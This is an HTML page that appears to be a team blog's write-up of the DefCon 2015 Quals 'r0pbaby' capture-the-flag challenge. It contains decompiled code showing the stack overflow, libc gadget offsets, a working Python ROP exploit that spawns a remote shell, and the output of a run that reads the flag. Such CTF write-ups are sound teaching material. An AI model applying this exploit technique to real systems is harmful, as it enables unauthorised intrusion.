@@ -1,0 +1,713 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>DefConCTF 2015 Quals - ROPBaby Writeup - GeeksSpeak Team Blog</title>
+  <meta name="author" content="GeeksSpeak">
+
+  
+  <meta name="description" content="DefConCTF 2015 ROPBaby Writeup
+Point = 1
+Category = Pwnable As the challenge name proved we should use ROP technique to read flag from the server ( &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="GeeksSpeak Team Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">GeeksSpeak Team Blog</a></h1>
+  
+    <h2>WriteUps and random thoughts</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="geeksspeak.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">DefConCTF 2015 Quals - ROPBaby Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-18T21:16:42+04:30'><span class='date'><span class='date-month'>May</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:16 pm</span></time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://geeksspeak.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><strong>DefConCTF 2015 ROPBaby Writeup</strong><br/>
+<strong>Point = 1</strong><br/>
+<strong>Category = Pwnable</strong></p>
+
+<p>As the challenge name proved we should use ROP technique to read flag from the server ( or pop a shell ).</p>
+
+<blockquote><p>r0pbaby_542ee6516410709a1421141501f03760</p></blockquote>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./r0pbaby_542ee6516410709a1421141501f03760 
+</span><span class='line'>
+</span><span class='line'>Welcome to an easy Return Oriented Programming challenge...
+</span><span class='line'>Menu:
+</span><span class='line'>1) Get libc address
+</span><span class='line'>2) Get address of a libc function
+</span><span class='line'>3) Nom nom r0p buffer to stack
+</span><span class='line'>4) Exit
+</span><span class='line'>: 1
+</span><span class='line'>libc.so.6: 0x00007FF0352429B0
+</span><span class='line'>1) Get libc address
+</span><span class='line'>2) Get address of a libc function
+</span><span class='line'>3) Nom nom r0p buffer to stack
+</span><span class='line'>4) Exit
+</span><span class='line'>: 2
+</span><span class='line'>Enter symbol: system
+</span><span class='line'>Symbol system: 0x00007FF034A9DC40
+</span><span class='line'>1) Get libc address
+</span><span class='line'>2) Get address of a libc function
+</span><span class='line'>3) Nom nom r0p buffer to stack
+</span><span class='line'>4) Exit
+</span><span class='line'>: 
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So we have address of any symbols of the <code>libc.so.6</code>.</p>
+
+<p>Let&rsquo;s check the binary in IDA, the main function is <code>sub_C46</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>__int64 sub_C46()
+</span><span class='line'>{
+</span><span class='line'>  __int64 v0; // rax@2
+</span><span class='line'>  signed int v1; // eax@4
+</span><span class='line'>  __int64 v2; // rax@12
+</span><span class='line'>  unsigned __int64 v3; // r14@15
+</span><span class='line'>  int v4; // er13@17
+</span><span class='line'>  size_t v5; // r12@17
+</span><span class='line'>  int v6; // eax@18
+</span><span class='line'>  void *handle; // [sp+8h] [bp-448h]@1
+</span><span class='line'>  char nptr[1088]; // [sp+10h] [bp-440h]@2
+</span><span class='line'>  __int64 savedregs; // [sp+450h] [bp+0h]@22
+</span><span class='line'>
+</span><span class='line'>  setvbuf(stdout, 0LL, 2, 0LL);
+</span><span class='line'>  signal(14, handler);
+</span><span class='line'>  puts("\nWelcome to an easy Return Oriented Programming challenge...");
+</span><span class='line'>  puts("Menu:");
+</span><span class='line'>  handle = dlopen("libc.so.6", 1);
+</span><span class='line'>  while ( 1 )
+</span><span class='line'>  {
+</span><span class='line'>    while ( 1 )
+</span><span class='line'>    {
+</span><span class='line'>      while ( 1 )
+</span><span class='line'>      {
+</span><span class='line'>        while ( 1 )
+</span><span class='line'>        {
+</span><span class='line'>          sub_BF7();
+</span><span class='line'>          LODWORD(v0) = sub_B9A(nptr, 1024LL);
+</span><span class='line'>          if ( !v0 )
+</span><span class='line'>          {
+</span><span class='line'>            puts("Bad choice.");
+</span><span class='line'>            return 0LL;
+</span><span class='line'>          }
+</span><span class='line'>          v1 = strtol(nptr, 0LL, 10);
+</span><span class='line'>          if ( v1 != 2 )
+</span><span class='line'>            break;
+</span><span class='line'>          __printf_chk(1LL, "Enter symbol: ");
+</span><span class='line'>          LODWORD(v2) = sub_B9A(nptr, 64LL);
+</span><span class='line'>          if ( v2 )
+</span><span class='line'>          {
+</span><span class='line'>            dlsym(handle, nptr);
+</span><span class='line'>            __printf_chk(1LL, "Symbol %s: 0x%016llX\n");
+</span><span class='line'>          }
+</span><span class='line'>          else
+</span><span class='line'>          {
+</span><span class='line'>            puts("Bad symbol.");
+</span><span class='line'>          }
+</span><span class='line'>        }
+</span><span class='line'>        if ( v1 &gt; 2 )
+</span><span class='line'>          break;
+</span><span class='line'>        if ( v1 != 1 )
+</span><span class='line'>          goto LABEL_24;
+</span><span class='line'>        __printf_chk(1LL, "libc.so.6: 0x%016llX\n");
+</span><span class='line'>      }
+</span><span class='line'>      if ( v1 != 3 )
+</span><span class='line'>        break;
+</span><span class='line'>      __printf_chk(1LL, "Enter bytes to send (max 1024): ");
+</span><span class='line'>      sub_B9A(nptr, 1024LL);
+</span><span class='line'>      v3 = (signed int)strtol(nptr, 0LL, 10);
+</span><span class='line'>      if ( v3 - 1 &gt; 0x3FF )
+</span><span class='line'>      {
+</span><span class='line'>        puts("Invalid amount.");
+</span><span class='line'>      }
+</span><span class='line'>      else
+</span><span class='line'>      {
+</span><span class='line'>        if ( v3 )
+</span><span class='line'>        {
+</span><span class='line'>          v4 = 0;
+</span><span class='line'>          v5 = 0LL;
+</span><span class='line'>          while ( 1 )
+</span><span class='line'>          {
+</span><span class='line'>            v6 = _IO_getc(stdin);
+</span><span class='line'>            if ( v6 == -1 )
+</span><span class='line'>              break;
+</span><span class='line'>            nptr[v5] = v6;
+</span><span class='line'>            ++v4;
+</span><span class='line'>            v5 = v4;
+</span><span class='line'>            if ( v3 &lt;= v4 )
+</span><span class='line'>              goto LABEL_22;
+</span><span class='line'>          }
+</span><span class='line'>          v5 = v4 + 1;
+</span><span class='line'>        }
+</span><span class='line'>        else
+</span><span class='line'>        {
+</span><span class='line'>          v5 = 0LL;
+</span><span class='line'>        }
+</span><span class='line'>LABEL_22:
+</span><span class='line'>        memcpy(&savedregs, nptr, v5);
+</span><span class='line'>      }
+</span><span class='line'>    }
+</span><span class='line'>    if ( v1 == 4 )
+</span><span class='line'>      break;
+</span><span class='line'>LABEL_24:
+</span><span class='line'>    puts("Bad choice.");
+</span><span class='line'>  }
+</span><span class='line'>  dlclose(handle);
+</span><span class='line'>  puts("Exiting.");
+</span><span class='line'>  return 0LL;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After resolving symbols we can use third menu to overflow and execute our chain.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ file ./r0pbaby_542ee6516410709a1421141501f03760
+</span><span class='line'>./r0pbaby_542ee6516410709a1421141501f03760: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
+</span><span class='line'>$ checksec.sh --file ./r0pbaby_542ee6516410709a1421141501f03760
+</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+</span><span class='line'>No RELRO        No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   ./r0pbaby_542ee6516410709a1421141501f03760
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>but there may be a problem since we don&rsquo;t have the <code>libc.so.6</code>. but we have, don&rsquo;t we? :)
+i used the libc&rsquo;s version of the <code>babycmd</code> challenge.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./lib/x86_64-linux-gnu/libc.so.6 
+</span><span class='line'>GNU C Library (Ubuntu EGLIBC 2.19-0ubuntu6.6) stable release version 2.19, by Roland McGrath et al.
+</span><span class='line'>Copyright (C) 2014 Free Software Foundation, Inc.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>so you can find it here: [<a href="http://packages.ubuntu.com/trusty/libc6">http://packages.ubuntu.com/trusty/libc6</a>]</p>
+
+<p>** note: just use LD_LIBRARY_PATH to use this version to implement the attack completely.</p>
+
+<p>Then i found the offset of <code>/bin/sh</code> and <code>pop rdi; ret</code> from the <code>system</code> symbols of the our given <code>libc.so.6</code> as you can see below:
+* /bin/sh offset from system: +0x13669b
+* pop rdi; ret offset from system: -0x23b26</p>
+
+<p>you can see my implementation here:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/python
+</span><span class='line'>
+</span><span class='line'>import socket
+</span><span class='line'>import struct
+</span><span class='line'>import telnetlib
+</span><span class='line'>
+</span><span class='line'>def readuntil(f, delim=': '):
+</span><span class='line'>    data = ''
+</span><span class='line'>    while not data.endswith(delim):
+</span><span class='line'>        c = f.read(1)
+</span><span class='line'>        assert len(c) &gt; 0
+</span><span class='line'>        data += c
+</span><span class='line'>    #print data
+</span><span class='line'>    return data
+</span><span class='line'>
+</span><span class='line'>def p(v):
+</span><span class='line'>    return struct.pack('&lt;Q', v)
+</span><span class='line'>
+</span><span class='line'>def u(v):
+</span><span class='line'>    return struct.unpack('&lt;Q', v)[0]
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>#s = socket.create_connection(("127.0.0.1", 1337))
+</span><span class='line'>s = socket.create_connection(("r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me", 10436))
+</span><span class='line'>f = s.makefile('rw', bufsize=0)
+</span><span class='line'>
+</span><span class='line'>raw_input("$") # attach debugger
+</span><span class='line'>
+</span><span class='line'>print s.recv(1024)
+</span><span class='line'>f.write("1\n")
+</span><span class='line'>readuntil(f, "0x")
+</span><span class='line'>a = f.read(16)
+</span><span class='line'>print a
+</span><span class='line'>libc = int(a, 16)
+</span><span class='line'>
+</span><span class='line'>f.write("2\nsystem\n")
+</span><span class='line'>readuntil(f, "0x")
+</span><span class='line'>system = int(f.read(16), 16)
+</span><span class='line'>print hex(system)
+</span><span class='line'>
+</span><span class='line'>f.write("3\n32\n"+"A"*8+p(system-0x23b26)+p(system+0x13669b)+p(system)+"\n")
+</span><span class='line'>
+</span><span class='line'>print "[+] shell is ready: "
+</span><span class='line'>t = telnetlib.Telnet()
+</span><span class='line'>t.sock = s
+</span><span class='line'>t.interact()
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and launching the attack:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ python r0pbaby-expl.py 
+</span><span class='line'>$
+</span><span class='line'>
+</span><span class='line'>Welcome to an easy Return Oriented Programming challenge...
+</span><span class='line'>Menu:
+</span><span class='line'>1) Get libc address
+</span><span class='line'>2) Get address of a libc function
+</span><span class='line'>3) Nom nom r0p buffer to stack
+</span><span class='line'>4) Exit
+</span><span class='line'>: 
+</span><span class='line'>00007F9F01F43AB0
+</span><span class='line'>0x7f9f0179f640
+</span><span class='line'>[+] shell is ready: 
+</span><span class='line'>
+</span><span class='line'>1) Get libc address
+</span><span class='line'>2) Get address of a libc function
+</span><span class='line'>3) Nom nom r0p buffer to stack
+</span><span class='line'>4) Exit
+</span><span class='line'>: Enter bytes to send (max 1024): 1) Get libc address
+</span><span class='line'>2) Get address of a libc function
+</span><span class='line'>3) Nom nom r0p buffer to stack
+</span><span class='line'>4) Exit
+</span><span class='line'>: Bad choice.
+</span><span class='line'>ls
+</span><span class='line'>bin
+</span><span class='line'>boot
+</span><span class='line'>[..]
+</span><span class='line'>cat /home/r0pbaby/flag
+</span><span class='line'>The flag is: W3lcome TO THE BIG L3agu3s kiddo, wasn't your first?</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And another 1 point. Thanks #defconctf</p>
+
+<p>@HAMIDx9</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">GeeksSpeak</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-05-18T21:16:42+04:30'><span class='date'><span class='date-month'>May</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:16 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/defconctf/'>defconctf</a>, <a class='category' href='/blog/categories/pwn/'>pwn</a>, <a class='category' href='/blog/categories/rop/'>rop</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup/" data-via="" data-counturl="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/05/18/defconctf-2015-quals-catwestern-writeup/" title="Previous Post: DefConCTF 2015 Quals - Catwestern Writeup">&laquo; DefConCTF 2015 Quals - Catwestern Writeup</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup/">DefConCTF 2015 Quals - ROPBaby Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/05/18/defconctf-2015-quals-catwestern-writeup/">DefConCTF 2015 Quals - Catwestern Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/05/18/defconctf-2015-quals-mathwize-writeup/">DefConCTF 2015 Quals - Mathwize Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/05/18/defconctf-2015-quals-babycmd-writeup/">DefConCTF 2015 Quals - Babycmd Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup/">PlaidCTF CTF 2015 - EBP Writeup</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating&#8230;</li>
+  </ul>
+  
+  <a href="https://github.com/GeeksSpeak">@GeeksSpeak</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'GeeksSpeak',
+            count: 0,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - GeeksSpeak -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'geeksspeak';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup/';
+        var disqus_url = 'http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
